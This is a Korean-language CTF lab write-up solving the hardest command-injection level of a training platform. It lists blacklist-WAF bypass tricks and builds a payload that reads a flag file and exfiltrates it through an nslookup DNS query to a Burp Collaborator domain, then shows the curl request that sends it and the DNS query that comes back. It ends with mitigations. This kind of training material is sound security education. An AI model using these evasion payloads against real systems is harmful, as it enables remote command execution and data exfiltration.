+++
title = "VulnABLE CTF [LUXORA]: Command Injection 💎 Platinum (WAF & Blind Evasion)"
description = "LUXORA 플랫폼의 최고 난이도 Command Injection, 다중 필터 우회 및 Blind 데이터 추출의 결합 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Platinum", "OOB", "WAF Bypass"]
+++

# VulnABLE CTF [LUXORA]: Command Injection 💎 Platinum

Command Injection의 정점이자 최고 난이도인 **Platinum 💎** 입니다. `/cmdi/platinum` 라우트는 OOB(Out-of-Band) 추출을 해야 하는 Blind 환경임과 동시에, 입력값에 대해 매우 엄격한 **블랙리스트 WAF(웹 방화벽)**가 적용되어 있습니다.

지금까지 배운 모든 우회 기법과 추출 기법을 영혼까지 끌어모아(Chaining) 하나의 완벽한 페이로드로 만들어내는 과정을 살펴보겠습니다.

---

## 🕒 1. 타겟 탐색 및 필터 제약 확인 (Reconnaissance)

`/cmdi/platinum` 역시 시스템 진단 도구처럼 보이지만, 반응이 없습니다. 
테스트를 통해 알아낸 차단 정책은 다음과 같습니다.

* **차단된 특수문자**: 공백(` `), 세미콜론(`;`), 백틱(`` ` ``), 파이프(`|`), 앰퍼샌드(`&`), 슬래시(`/`)
* **차단된 명령어**: `ping`, `curl`, `wget`, `nc`, `cat`, `flag`

**[해커의 사고 과정]**
* 결과를 안 보여주니 **DNS OOB(Out-of-Band)**로 빼내야 한다.
* 하지만 DNS를 날릴 `ping`이나 `curl`이 막혔다. 대체 명령어가 필요하다!
* `cat`과 `flag`가 막혔으니 와일드카드(`*`나 `?`)를 써서 파일명을 우회해야 한다.
* 띄어쓰기가 막혔으니 `$IFS`를 써야 한다.
* 명령어 구분자(`;`, `|`, `&`)가 막혔으니 **개행문자(`%0a`)**를 써야 한다.

---

## 🕒 2. 극한의 우회 전략 설계 (Bypass Strategies)

### Strategy 1: 차단된 명령어(`ping`) 우회
리눅스에는 도메인 해석을 시도하는 수많은 명령어가 있습니다. `ping`이 막혔다면, DNS 질의 전용 도구인 **`nslookup`**이나 **`dig`**, 혹은 **`host`**를 사용합니다.

### Strategy 2: 차단된 명령어(`cat`) 우회
파일을 읽어오는 명령어는 `cat` 말고도 많습니다.
* `tac`, `more`, `less`, `head`, `tail`, `od`, `sort`
여기서는 **`head`**를 사용하겠습니다.

### Strategy 3: 특정 문자열(`flag`) 우회
파일 이름에 `flag`가 들어가면 막힙니다. 리눅스 쉘의 **와일드카드(Wildcard)**를 사용합니다.
* `flag_platinum.txt` ➔ `f*g_p*.txt` 또는 `f?ag_*` 

### Strategy 4: 백틱(`` ` ``) 우회 (Command Substitution)
명령어 안에 명령어를 실행하는 백틱이 막혔다면, 달러 괄호 **`$()`** 문법을 사용합니다.

---

## 🕒 3. 공격 수행 및 페이로드 조립 (Exploitation)

목표 명령어의 원래 형태:
`ping -c 1 $(cat flag_platinum.txt).해커도메인.com`

**[우회를 거친 변환 형태]**
1. `ping` ➔ `nslookup`
2. `cat` ➔ `head`
3. `flag` ➔ `f*g_*.txt`
4. 공백 ➔ `$IFS`
5. 백틱 ➔ `$()`
6. 구분자 ➔ `%0a` (개행)

**[최종 조립된 페이로드 (URL 인코딩 포함)]**
```http
ip=8.8.8.8%0anslookup$IFS$(head$IFS/f*g_p*.txt).abc123xyz.burpcollaborator.net
```

*(참고: 슬래시 `/`가 막혀있으므로 파일이 현재 디렉터리에 있다면 생략하거나, 경로 이동 변수 등을 써야 합니다. 여기서는 현재 디렉터리(`f*g_*.txt`)로 가정합니다.)*

### 🚀 페이로드 전송
```bash
$ curl -X POST http://localhost:3000/cmdi/platinum -d "ip=8.8.8.8%0anslookup\$IFS\$(head\$IFS\f*g_p*.txt).abc123xyz.burpcollaborator.net"
```

### 🔍 공격 결과
WAF는 페이로드 안에 `ping`, `cat`, `flag`, 공백, 세미콜론이 없으므로 무사 통과시킵니다.
서버 내부의 bash 쉘은 이 난해한 문장을 다음과 같이 찰떡같이 해석합니다:
1. `f*g_p*.txt` 패턴에 맞는 파일을 찾아 `head`로 읽음.
2. 읽은 내용(`FLAG{...}`)을 도메인 주소 앞에 붙여 `nslookup` 실행.
3. 해커의 DNS 서버로 질의가 날아옴!

```text
[DNS Query Received at Burp Collaborator]
Type: A
Domain: FLAG{CMDI_💎_PLATINUM_MASTER_A1B2}.abc123xyz.burpcollaborator.net
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{CMDI_💎_PLATINUM_MASTER_A1B2}`

### 📝 왜 이런 공격이 성공했는가?
블랙리스트 필터링의 본질적인 한계와 리눅스 쉘(Bash)의 무한한 확장성이 만난 결과입니다. 해커는 시스템 내부에 기본 탑재된 수많은 명령어(Living off the Land Binaries, LOLBins)와 쉘 문법을 조합하여 WAF의 룰셋을 농락할 수 있습니다.

### 🛡️ 방어 대책 (Mitigation)
아무리 뛰어난 WAF 규칙(정규식)을 짜더라도 우회 방법은 반드시 나옵니다.
1. **Command Execution 절대 금지**: 웹 애플리케이션에서 `os.system()`, `exec()` 등을 쓰지 마세요.
2. **구조적 분리**: 반드시 외부 프로그램을 호출해야 한다면, 실행 파일 경로와 인자(Arguments)를 명확히 분리하는 API(Node.js의 `spawn` 등)를 사용하여, 입력값이 쉘로 파싱(해석)되지 않게 만들어야 합니다.

지금까지 Command Injection의 기초부터 최상위 기법까지 알아보았습니다. 다음은 현대 웹 인증의 핵심인 **JWT (JSON Web Token) 공격**을 다루어보겠습니다!